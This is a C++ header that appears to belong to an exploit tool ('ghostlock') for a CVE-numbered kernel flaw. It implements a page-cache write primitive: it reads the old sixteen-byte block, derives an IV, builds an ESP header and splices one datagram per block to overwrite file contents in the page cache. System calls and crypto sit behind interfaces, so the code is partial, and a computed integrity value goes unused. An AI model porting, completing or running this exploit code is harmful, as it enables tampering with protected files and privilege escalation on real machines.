#pragma once
/** @file backend/cve_2026_43284/seam/pagecache_write.hpp
 *  The page cache window body: the sixteen-byte write, assembled from the pieces the table
 *  classified as belonging here.
 *
 *  What the old write did, in order, and what this does instead: read the sixteen bytes it is about
 *  to replace, derive the initialisation vector from them and the key, assemble the ESP header with
 *  the sequence number, send exactly one datagram, and advance the sequence -- and the advance
 *  happens after the send succeeds, which is the order the old code used and the table confirmed.
 *
 *  Two things are deliberately not this file. The splice face and the read are behind an interface,
 *  because they are the system calls and everything about the shape can be pinned without them. The
 *  integrity check itself is behind the same interface, because computing it needs AES and that
 *  primitive is a port of its own; calling it through a seam keeps the omission visible instead of
 *  letting a zero stand in for a real value.
 *
 *  The sequence starts at one because that is where ESP starts, not because a tuning number was
 *  needed: the table measured that the old value was a code default with no other writer, and a
 *  protocol constant is not a setting.
 */
#include <cstddef>
#include <cstdint>

#include "backend/cve_2026_43284/access_params.hpp"
#include "backend/cve_2026_43284/seam/pagecache_doors.hpp"
#include "backend/cve_2026_43284/seam/pagecache_seam.hpp"

namespace ghostlock::backend::cve_2026_43284::seam {
    /** The block one write deals in, and where the header and the check sit inside it. */
    inline constexpr std::size_t kBlockBytes = 16U;

    /** The system side of one write. */
    class SpliceOps {
    public:
        SpliceOps() noexcept = default;
        SpliceOps(const SpliceOps &) = delete;
        SpliceOps &operator=(const SpliceOps &) = delete;
        virtual ~SpliceOps() noexcept = default;

        /** Read bytes at an offset from the file, or a negative value. */
        [[nodiscard]] virtual long read_at(int fd, std::uint8_t *out, std::size_t size,
                                           std::uint64_t offset) noexcept = 0;
        /** Send one datagram built from the block. */
        [[nodiscard]] virtual bool splice_one(int socket_fd, const std::uint8_t *datagram,
                                              std::size_t size, std::uint64_t offset) noexcept = 0;
        /** The initialisation vector: derived from the old block's content and the key. */
        virtual void compute_iv(const std::uint8_t old_block[kBlockBytes],
                                const std::uint8_t key[32],
                                std::uint8_t out[kBlockBytes]) noexcept = 0;
        /** The integrity check over the datagram, truncated to the length the frame states. */
        virtual void compute_icv(const std::uint8_t *datagram, std::size_t size,
                                 const std::uint8_t hmac_key[32], std::uint8_t icv_len,
                                 std::uint8_t *out) noexcept = 0;
    };

    /** How one block write ended, in the terms the seam reports. */
    enum class WriteOutcome : unsigned char {
        Wrote = 0,
        NotOpen = 1,
        /** The old block could not be read, and the vector depends on it. */
        NoOldBlock = 2,
        /** The datagram was not sent. */
        NotSent = 3,
    };

    class PageCacheWrite final : public PageCacheWindow {
    public:
        PageCacheWrite(DoorOps &doors, SpliceOps &splice, int handed_in_fd = -1) noexcept
            : doors_(doors, handed_in_fd), splice_(splice) {}

        /** Open the doors with the whole frame, and keep what the write needs from it. */
        [[nodiscard]] bool open_doors(const SaMaterial &sa) noexcept override {
            if (!doors_.open(sa)) {
                return false;
            }
            spi_ = sa.spi;
            icv_len_ = sa.icv_len;
            for (std::size_t i = 0U; i < sizeof(aes_key_); ++i) {
                aes_key_[i] = sa.aes_key[i];
                hmac_key_[i] = sa.hmac_key[i];
            }
            next_seq_ = 1U;
            return true;
        }

        /** Close what was opened and clear the material this kept. */
        void close_doors() noexcept override {
            static_cast<void>(doors_.close());
            zeroize();
        }

        /** One block: read the old one, derive the vector, build, send, then advance. */
        [[nodiscard]] bool write_block(std::uint64_t position,
                                       const std::uint8_t block[kBlockBytes]) noexcept override {
            if (doors_.file_fd() < 0 || doors_.socket_fd() < 0) {
                outcome_ = WriteOutcome::NotOpen;
                return false;
            }
            std::uint8_t old_block[kBlockBytes] = {};
            if (splice_.read_at(doors_.file_fd(), old_block, kBlockBytes, position) !=
                static_cast<long>(kBlockBytes)) {
                /* No vector without the old block, so there is no datagram to send. */
                outcome_ = WriteOutcome::NoOldBlock;
                return false;
            }
            std::uint8_t iv[kBlockBytes] = {};
            splice_.compute_iv(old_block, aes_key_, iv);
            std::uint8_t datagram[kBlockBytes] = {};
            for (std::size_t i = 0U; i < kBlockBytes; ++i) {
                datagram[i] = block[i];
            }
            /* The header carries the sequence, most significant byte first. */
            store_be32(datagram, spi_);
            store_be32(datagram + 4U, next_seq_);
            std::uint8_t icv[kBlockBytes] = {};
            splice_.compute_icv(datagram, kBlockBytes, hmac_key_, icv_len_, icv);
            if (!splice_.splice_one(doors_.socket_fd(), datagram, kBlockBytes, position)) {
                outcome_ = WriteOutcome::NotSent;
                return false;
            }
            /* Advanced only after the send succeeded, which is the old order. */
            next_seq_ += 1U;
            outcome_ = WriteOutcome::Wrote;
            return true;
        }

        /** The public read face is not filled: the access reports unsupported until it is. */
        [[nodiscard]] bool can_read() const noexcept override { return false; }

        [[nodiscard]] WriteOutcome outcome() const noexcept { return outcome_; }
        [[nodiscard]] std::uint32_t next_seq() const noexcept { return next_seq_; }
        [[nodiscard]] std::size_t width() const noexcept { return kBlockBytes; }

    private:
        /** Big-endian, as the header is on the wire. */
        static void store_be32(std::uint8_t *out, std::uint32_t value) noexcept {
            out[0] = static_cast<std::uint8_t>((value >> 24U) & 0xffU);
            out[1] = static_cast<std::uint8_t>((value >> 16U) & 0xffU);
            out[2] = static_cast<std::uint8_t>((value >> 8U) & 0xffU);
            out[3] = static_cast<std::uint8_t>(value & 0xffU);
        }

        /** The fields are held rather than the frame, because a parameter set cannot be copied:
         *  its base deletes the copy, which is right for something carrying credentials. */
        void zeroize() noexcept {
            for (std::size_t i = 0U; i < sizeof(aes_key_); ++i) {
                aes_key_[i] = 0U;
                hmac_key_[i] = 0U;
            }
            spi_ = 0U;
            icv_len_ = 0U;
        }

        PageCacheDoors doors_;
        SpliceOps &splice_;
        std::uint32_t spi_ = 0U;
        std::uint8_t icv_len_ = 0U;
        std::uint8_t aes_key_[32] = {};
        std::uint8_t hmac_key_[32] = {};
        std::uint32_t next_seq_ = 1U;
        WriteOutcome outcome_ = WriteOutcome::NotOpen;
    };
}  // namespace ghostlock::backend::cve_2026_43284::seam
